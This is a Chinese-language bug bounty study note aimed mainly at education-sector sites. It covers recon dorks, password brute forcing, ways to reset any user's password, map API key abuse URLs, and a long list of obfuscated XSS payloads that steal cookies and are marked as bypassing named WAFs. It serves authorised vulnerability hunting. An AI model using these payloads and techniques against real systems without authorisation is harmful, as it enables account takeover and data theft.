# SRC挖掘

## 挖掘思路

### **一、步骤评价与细化**

#### **1. 信息收集：全面覆盖边缘资产** ✅

**细化建议：**

- **资产测绘工具组合**：
  - 使用 **FOFA**（`org="China Education and Research Network Center"`）和 **鹰图** 搜索教育网段IP、子域名，重点关注非主站资产（如后勤系统、图书馆系统）。
  - 结合 **OneForAll** 爆破三级域名（如 `xxx.xxx.edu.cn`），筛选低权重边缘资产（如职业学院、附属医院网站）。
- **JS接口与敏感信息**：
  - 使用 **JSFinder** 提取JS文件中的API路径（如登录、文件上传接口），重点关注未授权访问漏洞。
  - 在GitHub搜索目标学校的关键词（`site:github.com "password" AND "xxx.edu.cn"`），挖掘泄露的数据库配置或API密钥。

**补充内容：**

- **小程序/APP逆向**：
  - 使用 **Charles抓包** 分析学校官方APP的接口，寻找硬编码密钥或未加密的敏感请求（如成绩查询接口）。
- **IP反查与C段扫描**：
  - 通过 **微步在线** 反向查询IP绑定的域名，利用 **BBScan** 扫描C段存活主机，寻找暴露的管理后台（如 `admin.xxx.edu.cn`）。

------

#### **2. 弱口令与逻辑漏洞：优先突破点** ✅

**细化建议：**

- **弱口令爆破策略**：
  - **目标选择**：主攻登录页面（如OA系统、VPN入口），使用字典 `admin/123456`、`学号/出生日期` 组合。
  - **工具推荐**：Burp Intruder（设置Payload类型为 `Custom iterator` 组合用户名密码）、Hydra（针对SSH/FTP服务）。
- **逻辑漏洞挖掘方向**：
  - **越权测试**：修改请求参数（如用户ID、订单号），测试权限绕过（如查看他人成绩单）。
  - **并发漏洞**：使用Burp插件（如 **Turbo Intruder**）测试重复提交（如奖学金申请、课程抢选）导致的资源滥用。

**补充内容：**

- **组合漏洞利用**：
  - 若发现CSRF漏洞（如删除帖子），尝试结合XSS漏洞构造链式攻击（如诱导用户点击链接触发删除+弹窗钓鱼）。

------

#### **3. Poc扫描与批量检测：效率提升关键** ✅

**细化建议：**

- **Poc库选择**：
  - 优先使用 **佩奇漏洞文库**、**Nuclei模板**，筛选教育行业常见漏洞（如泛微OA、Spring Boot Actuator未授权）。
  - 关注 **Seebug** 平台近期NDay漏洞（如Log4j、Fastjson），快速编写Python脚本批量检测。
- **工具链优化**：
  - **存活验证**：使用 **httpx** 过滤无效URL（`httpx -l urls.txt -mc 200 -o alive.txt`）。
  - **自动化扫描**：结合 **Xray**（被动代理模式）和 **AWVS**（主动扫描），手动验证误报点（如误判的SQL注入）。

**补充内容：**

- **指纹识别与定向攻击**：
  - 使用 **Wappalyzer** 识别CMS框架（如Discuz!、ThinkPHP），针对历史漏洞定向测试（如ThinkPHP 5.0 RCE）。

------

#### **4. 绕WAF：暂时搁置但可浅尝** ⚠️

**替代方案（低门槛绕过技巧）：**

- **简单Payload变形**：
  - SQL注入：使用内联注释（`/*!50000select*/`）或URL编码（`%20→%0a`）。
  - XSS：利用HTML实体编码（`< → <`）或事件处理器（`onmouseover=alert(1)`）。
- **第三方工具辅助**：
  - 如网页8案例，使用迅雷下载被403限制的文件（如视频、图片），绕过登录鉴权。

------

### **二、补充关键步骤**

#### **5. 关注厂商动态与漏洞收录范围** 🔍

- **活动期重点突破**：
  - 学校官网公告中寻找新上线系统（如迎新系统、在线考试平台），漏洞率较高。
  - 关注EDUSRC奖励翻倍活动（如开学季、校庆），提升漏洞价值。
- **规避无效测试**：
  - 仔细阅读EDUSRC漏洞收录规则（如不接收XSS低危漏洞），避免白做功。

#### **6. 漏洞报告规范化** 📝

- **报告模板优化**：
  - 结构：漏洞描述 → 复现步骤（附HTTP包截图） → 危害证明（如数据库泄露截图） → 修复建议。
  - 使用 **Burp Collaborator** 验证漏洞有效性（如SSRF触发DNS回调）。
- **提升通过率技巧**：
  - 优先提交高危漏洞（如未授权访问、逻辑越权），中低危漏洞作为补充。

------

### **三、工具与资源推荐**

| **类别**     | **推荐工具/资源**                                            | **用途**           |
| ------------ | ------------------------------------------------------------ | ------------------ |
| 资产测绘     | FOFA、鹰图、OneForAll                                        | 子域名/IP收集      |
| 漏洞扫描     | Nuclei、Xray、AWVS                                           | 批量检测NDay漏洞   |
| 逻辑漏洞测试 | Burp Suite（Intruder/Repeater）、Turbo Intruder              | 越权、并发漏洞验证 |
| 报告撰写     | Markdown语法、Snipaste（截图工具）                           | 规范化漏洞报告     |
| 学习资料     | [佩奇漏洞文库](http://wiki.peiqi.tech/)、[LandGrey的SpringBoot漏洞利用指南](https://github.com/LandGrey/SpringBootVulExploit) | 漏洞复现与利用     |

------

### **四、总结**

你的步骤框架合理，但需进一步**细化执行策略**：

1. **信息收集**：80%时间投入，覆盖边缘资产与敏感接口；
2. **漏洞挖掘**：优先弱口令+逻辑漏洞，辅以Poc批量扫描；
3. **绕过技巧**：暂不深入但掌握简单变形；
4. **动态调整**：根据EDUSRC反馈优化目标选择。

**关键点**：漏洞提交的**规范性**和**厂商匹配度**比技术难度更重要，初期以数量积累为主，逐步提升漏洞质量。

## SRC课程

### XSS

#### payload

- 检测标签

  ```html
  <s>123
  <h1>123</123>
  <p>123</p>
  </tExtArEa><h1>123</h1>#
  </tExtArEa><s>123#//--+
  '"></tExtArEa><s>123#//--+
  ```


- 混淆绕过

  ```html
  </tExtArEa>'"<a/href="ja%26Tab;vas%26Tab;cript%26Tab;%26Tab;%26Tab;:%26Tab;%26Tab;top%26Tab;[8680439..toString(30)]()">click_me</a>#
  
  <div class=\"media-wrap image-wrap\"><img src=\"https://img.threatbook.cn/c375eed802260503b4cee1086ea65f0e172480015227cf81a82d77.png\" onerror=\"alert`1`\"/></div>
  
  <script%20type="text/javascript">%20var%20reg%20=%20/test/;%20var%20str%20=%20%27testString%27;%20var%20result%20=%20reg.exec(str);%20alert(result);%20</script>
  ```

- 编码加密绕过

  ```html
  <iframe src="data:text/html;base64,PFNDcmlwdD5hbGVydCgxKTwvU0NyaXB0Pg=="></iframe
      
  <iframe src="data:text/html;base64,PG9iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQSE5qY21sd2RENWhiR1Z5ZENnbmVITnpKeWs4TDNOamNtbHdkRDQ9Pjwvb2JqZWN0Pg=="></iframe>
  
  <iframe src="data:text/html;base64,PG9iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQR0YxWkdsdklITnlZejB4SUc5dVpYSnliM0k5WTI5dVptbHliU2duZUhOemMzTW5LVDQ9Pjwvb2JqZWN0Pg=="></iframe>
  ```

- 冷门绕waf标签

  ```html
  "\"><s>12356789@qq.com      邮箱xss(验证)
  
  <sTylE OnLoAd=alert(1)>
  
  <dETAILS%0Aopen%0AonToGgle%0A=%0Aa=prompt,a()%20x>
  
  <dETAILS%0Aopen%0AonToGgle%0A=%0Aa=confirm,a()%20x>   #过携程和oppo
  
  22onmouseover=%22a=confirm,a(document.cookie)%22--+//%23    #过oppo
  
  <dETAILS%0Aopen%0AonToGgle%0A=%0Aa=confirm,a(document.cookie)%20x>
  
  <svg%20onmouseover%0A=%0Aa=confirm,a(1)>
  
  <svg%0Aonmouseover%0A=%0Aa=confirm,a(1)%20x>
  
  <svg%20onmouseover%0A=%0Aa=confirm,a(document.cookie)>
  
  '+onclick=a=alert,a(1)%2F%2F
  
  '+onclick=a=alert,a(1)--+
  
  '+onclick=a=confirm,a(1)--+
  
  '+onclick=a=confirm,a(1)%2F%2F
  
  %27+onclick='a=alert,a(1)'--+
  
  在对xss标签进行注释的时候要使用--+和// ，经测试%23无效。如果onload不能用就换成其他属性。
  
  <marquee behavior="alternate" onstart=alert(1)>123</marquee> 
  
  <MaRQuEe BehAvIor="alternate" onStArt=alert(1)>123</MaRQuEe>
  
  <body onpageshow=alert(1)>
  
  <body onPAgeShoW=confirm(111)>
  
  <details ontoggle=alert()>     向下按钮xss
  
  <SVg </onLoaD ="1> (_=prompt,_(1)) "">
  
  <script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));</script>
  
  <d3"<"/onclick="1>[confirm``]"<">dianwo        需要点击
  
  <w="/x="y>"/oNCliCk=`<`[confir\u006d``]>dianwo     需要点击
  
  <w="/x="y>"/ondblclick=`<`[confir\u006d``]>dianwo2        需要双击
  
  <w="/x="y>"/oNDblCliCk=`<`[confir\u006d``]>dianwo2        需要双击
  
  <!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
  
  <img/src/onerror=\u0061\u006c\u0065\u0072\u0074(1)>
  
  <object data=javascript:alert(1)>
  
  <svg onload=setInterval`alert\x28document.domain\x29`>    
  
  <img src=1 onerror=javascript:{{.('alert(1)')()}}>    点击一次
  
  <a href=javascript:{{.('alert(1)')()}}>dianwo</a>     点击一次
  
  <a href=javascript:<x ng-app>{{.('alert(1)')()}}>dianwo</a>    点击一次
  
  <a href=javascript:{{.('alert(1)')()}}>dianwo</a>   点击一次
  
  <d3"<"/onclick="1>[confirm``]"<">dianwo       点击一次
  
  <d3"<"/oNDblCliCk="1>[confirm``]"<">dianwo    需要双击
  
  <%00EEEE<svg /\/\//ONLoad='a\u006c\u0065\u0072\u0074(1)'/\/\/\>svg>
  
  <svg><set end=1 onend=[1].find(alert)>
  
  <body onpageshow="alert(1)">
  
  <details open ontoggle=alert(1)>    #这个可能不弹窗，但是可以造成xss
  
  <details open ontoggle=\u0061\u006c\u0065\u0072\u0074(1)>
  
  <details%20ontoggle=confirm()>//    #弹窗！
  ```

#### 上传xss

- PDF-XSS
- HTML-XSS
- SVG-XSS

### SQL注入

### 越权



### 并发



### 水洞



### 登录框



### 前后端分离



### 微信小程序



### 优惠券



### 支付漏洞



### EDU&CNVD



### JS逆向



### 云安全







## 套路积累

- 带聊天的小程序
  - 可从web端看能不能越权删数据，GET ../delete ...&id=
  
- 签订合同的api
  - 因合同号一般比较长，若是md5加密则解不出来，但可以猜测合同号长度（6-12），然后用burp遍历md5加密爆破。

- 找回密码
  - 若找回密码要回答密保问题，可看验证密保问题正确性的是否是cookie，且对于不同密保问题的cookie是否不变，若是即可自己设置密保拿到正确的cookie，然后再修改任意用户密码
  
- 404
  - 扫接口，扫目录

- 代码审计
  - EDUSRC找CMS技术支持公司，通过挖源码
  
- 绕WAF：高并发+脏数据，或是异形数据包

- 小程序自动化反编译

- bin类型文件含大量信息

- 含大量Cookie，逐个删掉找到决定用户权限的

  

### 地图key漏洞

#### 利用api

```py
高德webapi：https://restapi.amap.com/v3/direction/walking?origin=116.434307,39.90909&destination=116.434446,39.90816&key=这里写key

高德jsapi：https://restapi.amap.com/v3/geocode/regeo?key=这里写key&s=rsv3&location=116.434446,39.90816&callback=jsonp_258885_&platform=JS

高德小程序定位：https://restapi.amap.com/v3/geocode/regeo?key=这里写key&location=117.19674%2C39.14784&extensions=all&s=rsx&platform=WXJS&appname=c589cf63f592ac13bcab35f8cd18f495&sdkversion=1.2.0&logversion=2.0

百度webapi：https://api.map.baidu.com/place/v2/search?query=ATM机&tag=银行&region=北京&output=json&ak=这里写key

百度webapiIOS版：https://api.map.baidu.com/place/v2/search?query=ATM机&tag=银行&region=北京&output=json&ak=这里写key=iPhone7%2C2&mcode=com.didapinche.taxi&os=12.5.6

腾讯webapi： https://apis.map.qq.com/ws/place/v1/search?keyword=酒店&boundary=nearby(39.908491,116.374328,1000)&key=这里写key
```



#### 泄露语法

```py
奇安信hunter：(web.body="webapi.amap.com"||web.body="api.map.baidu.com"||web.body="apis.map.qq.com"||web.body="map.qq.com/api/js?v=")&&domain.suffix="根域名替换"

fofa：(body="webapi.amap.com"||body="api.map.baidu.com"||body="apis.map.qq.com"||body="map.qq.com/api/js?v=")&&domain="根域名替换"

钟馗之眼：
(Banner:"webapi.amap.com" Banner:"api.map.baidu.com" Banner:"map.qq.com/api")+site:"根域名替换"

360QUAKE:
domain:"根域名替换" AND (response: "webapi.amap.com" OR response: "api.map.baidu.com" OR response: "map.qq.com")
```

